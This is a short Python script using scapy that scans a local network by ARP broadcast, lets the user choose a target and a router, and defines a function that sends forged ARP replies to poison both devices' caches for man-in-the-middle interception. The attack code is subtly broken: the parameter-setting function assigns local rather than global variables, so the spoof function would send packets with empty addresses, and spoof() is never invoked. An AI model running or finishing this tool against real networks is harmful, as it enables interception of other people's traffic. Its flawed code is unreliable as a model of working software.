import scapy.all as scapy

target_ip = ""
target_mac = ""
router_ip = ""
router_mac = ""


def set_params(target, router):
    target_ip = target["ip"]
    target_mac = target["mac"]
    router_ip = router["ip"]
    router_mac = router["mac"]

    print(f"router ip {router_ip} \n router mac {router_mac} \n target ip {target_ip} \n target mac {target_mac}")


def get_details():
    ip = input(">> Enter the target ip range : ")
    arp_request = scapy.ARP(pdst=ip) 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered, unanswered = scapy.srp(arp_request_broadcast, timeout=2.5, verbose=False)

    print("Choice\tIP\t\t\t\tMAC Address\t\t")
    print("------------------------------------------")
    i = 0
    device_list = []
    for elements in answered:
        device_list.append({"choice": i, "ip": elements[1].psrc, "mac":elements[1].hwsrc})
        print(str(i) + "\t\t" + device_list[i]["ip"] + "\t\t\t\t" + device_list[i]["mac"])
        i+=1
    
    target = int(input(">> Select the target : "))
    router = int(input(">> Select the router : "))

    return (device_list[target], device_list[router])
    
    

    


def spoof():
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
    scapy.send(packet)
    packet = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip)
    scapy.send(packet)


(target, router) = get_details()
set_params(target, router)
